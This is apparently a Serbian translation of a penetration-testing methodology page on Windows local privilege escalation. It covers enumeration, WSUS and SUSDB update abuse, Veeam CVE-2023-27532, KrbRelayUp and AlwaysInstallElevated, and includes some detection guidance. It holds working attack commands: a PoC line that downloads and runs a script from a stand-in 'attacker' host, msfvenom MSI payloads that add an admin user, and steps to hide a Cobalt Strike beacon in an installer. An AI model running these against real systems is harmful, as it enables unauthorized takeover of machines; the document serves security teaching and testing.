# Lokalna eskalacija privilegija u Windowsu

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje vektora lokalne eskalacije privilegija u Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windowsu iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata DerbyCon prezentaciju o eskalaciji privilegija u Windowsu.<sup>[[5]](#references)</sup>

## Osnove Windowsa

### Pristupni tokeni

**Ako ne znate šta su Windows pristupni tokeni, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windowsu, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows bezbednosne kontrole

U Windowsu postoje različiti mehanizmi koji mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što počnete s enumeracijom za eskalaciju privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može omogućiti i da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema, a zatim u lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess tiha eskalacija privilegija

Procesi UIAccess pokrenuti putem `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje nivoa High IL bez upita, kada se zaobiđu AppInfo provere bezbedne putanje. Pročitajte namenski tok za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Širenje registra za pristupačnost na Secure Desktop-u može se zloupotrebiti za proizvoljan upis u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windowsa uvele su i putanju za **SMB na proizvoljnom portu** koja omogućava LPE, pri čemu se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windowsa (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti za određene verzije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje verziju OS-a, instalirane ispravke i potencijalno relevantna sigurnosna upozorenja; pre nego što rezultat smatrate primenljivim, proverite tačan proizvod i naknadne ispravke.

Za lokalni exploit specifičan za određenu verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično razrešava u 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajuću KB ispravku ne dokazuju da je exploitabilnost moguća; uporedite pokrenutu verziju, instaliranu ili naknadnu ispravku, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretan problem.

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Ima li sačuvanih akreditiva ili korisnih informacija u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell datoteke transkripta

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [Pravila za PowerShell transcription](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuju transkripte u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može preusmeriti datoteke u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu izlaznu putanju i ACL datoteke: transkript može sadržati argumente komandi i njihov izlaz, uključujući kredencijale. Čitljiv transkript je samo trag, osim ako njegov sadržaj ne otkriva upotrebljiv identitet sa višim privilegijama koji može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi potpuni detalji izvršavanja ni rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ dokumentacije, birajući **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se osigurava da se svaki blok koda dokumentuje dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji evidentirani za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete da koristite:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Podešavanja interneta

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint predstavlja trag za proveru presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od politike klijenta za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne omogućava izvršavanje koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Počnite tako što ćete proveriti da li mreža koristi WSUS ažuriranje koje ne koristi SSL, tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od ovih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Ovo potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali ne dokazuje da su presretanje, prihvatanje zlonamernih ažuriranja ili instalacija sa povišenim privilegijama mogući. Kada je postavljen na `0`, ovaj konkretni konfigurisani WSUS endpoint se ne bira tom politikom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Pročitajte ceo izveštaj ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U osnovi, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima Internet Explorera, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Osim toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik HSTS-u za sprovođenje validacije sertifikata tipa trust-on-first-use. Ako korisnik veruje prikazanom sertifikatu i on ima ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sva delegirana WSUS ovlašćenja, pa utvrdite koju grupu klijenata bi odobreno ažuriranje dobilo. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da je primenljiv na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB-u: nepotpisani sadržaji preko `.txt`/`.esd`

Ovo je drugačiji propust granice poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **procedurama baze podataka WSUS-a (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način za početni pristup jeste prosleđivanje naloga WSUS računara uzvodno do zasebnog MSSQL servera na kom se nalazi `SUSDB`; konkretan preduslov zavisi od implementacije, zato prvo nabrojte `EXECUTE` dozvole umesto da pretpostavljate da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 ka LDAP-у, SMB-у ili AD CS-у, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Kreiranje, ciljanje i odobravanje ažuriranja

Tok rada za prilagođena ažuriranja koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizaciju i proširenja | `spSaveXMLFragment` |
| Povezivanje digest-a sadržaja sa URL-om pod kontrolom napadača | `spSetBatchURL` |
| Nabrajanje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Naziv datoteke, digest-i, veličina i handler `CommandLineInstallation` moraju da budu usklađeni u uvezenim metapodacima i fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i implementacije umesto da ponovo koristite primer GUID-ova.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje provere potpisa zasnovano na ekstenziji

WSUS obično odbija proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja `.NET` metode `VerifyFile` postavlja zastavicu za proveru sertifikata na `false` kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne proveri da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE, na primer pod imenom `payload.exe.txt`, može da prođe proveru sadržaja, a zatim ga može pokrenuti handler za instalaciju ažuriranja preko komandne linije. Ovo je greška u politici i konfuziji tipova, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Priprema i automatizacija kompatibilne sa BITS-om

Poziv `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvor mora da ispuni HTTP očekivanja BITS-a: samo dostupnost URL-a nije dovoljna, jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opsege bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da je BITS-u potrebno zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/group/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za pripremu sadržaja. Minimalni primer poziva u ovlašćenoj laboratoriji je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Izvršavanje bez nadzora i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno odmah je ponovo ponuđen nakon što je callback proces izašao, pa ponašanje pri ponovnom pokušaju može postati postojanost kroz ponovljeno izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Tačke za detekciju i ojačavanje zaštite

Korisne tačke za proveru na serveru i klijentu u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, spoljne izvore sadržaja, `.txt`/`.esd` payloade za ažuriranja i primene koje su izvršili neočekivani nalozi (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payloada i njegovim magic bajtovima umesto da verujete sufiksu.
- Tražite ponovljene neuspehe i pokušaje ponovnog pokretanja instalacije Windows Update-a, kao i izvršavanje PE fajlova ili neočekivane child/network aktivnosti od sadržaja sa imenima koja se završavaju na `.txt` ili `.esd`.
- Tamo gde je podržano, zahtevajte Extended Protection for Authentication za servis baze podataka i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i revidirajte ih.

## Ažureri trećih strana i Agent IPC (local privesc)

Mnogi poslovni agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se registracija može usmeriti na server napadača, a program za ažuriranje veruje lažnom root CA-u ili ima slabe provere potpisnika, lokalni korisnik može isporučiti zlonamerni MSI koji instalira SYSTEM servis. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect koriste osnovni servis za bekap koji podrazumevano sluša na **TCP/9401**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje akreditiva šifrovane konfiguracione baze podataka unutar mrežnog perimetra za bekap; zaseban javni PoC pokazuje putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i za adrese koje nisu localhost, pa proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, zatim proverite instalirani proizvod i metapodatke o zakrpama. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` predstavljaju naznake, ali nisu potpuna provera zakrpa.
- **Minimalne fiksne verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; ranija izdanja su pogođena. Četvorodelna verzija fajla sama po sebi ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istom broju izdanja. Pre nego što verziju na granici proglasite ispravljenom, proverite identifikator zakrpe u [istoriji verzija proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC kao što je `VeeamHax.exe` zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Navedeni PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje vendora opisuje problem otkrivanja kredencijala.
## KrbRelayUp

Lokalni Kerberos relay može omogućiti prelazak sa prijave sa nižim privilegijama na privilegovano upisivanje u direktorijum kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih puteva. RBCD lanac zahteva odgovarajuću delegaciju i prava nad ciljnim objektom, dok shadow-credential lanac zahteva prava upisa ključeva kredencijala i KDC koji podržava put autentifikacije sertifikatom. Nijedan od ovih puteva ne proizlazi samo iz članstva u domenu.

Proverite politiku stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za relayed identitet i nivoe autentifikacije i impersonation za izabranu COM klasu. Važni su tip prijave pozivaoca i kontekst kredencijala: WinRM sesija može se ponašati drugačije od interaktivne prijave ili prijave sa novim kredencijalima. Rutiranje kroz firewall/OXID i instalirane ispravke takođe mogu uticati na ishod. Permisivnu politiku ili odgovarajući ACL tretirajte kao kandidata za proveru; pasivna enumeracija ne bi trebalo da pokrene COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može dovesti do mašinskog tiketa i, samo ako taj nalog ima potrebna prava replikacije direktorijuma, do zasebnog DCSync puta.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz PowerUp-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da umotate „**.bat**“ fajl ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** novi Windows EXE TCP payload u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer“ u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Dajte projektu ime, na primer **AlwaysPrivesc**, kao lokaciju izaberite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Nastavite da klikćete na **Next** dok ne dođete do 3. koraka od 4 (izbor fajlova koje treba uključiti). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u** i u odeljku **Properties** promenite **TargetPlatform** iz **x86** u **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Tako će Beacon payload biti izvršen čim pokrenete instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste platformu podesili na x64.

### MSI instalacija

Da biste izvršili **instalaciju** zlonamernog `.msi` fajla u **pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirusni programi i detektori

### Podešavanja nadzora

Ova podešavanja određuju šta se **beleži**, zato obratite pažnju.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — korisno je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnih Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u okviru Active Directory-ja, a mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnih administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u potražite na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo unapređenu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju code, čime se sistem dodatno štiti.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

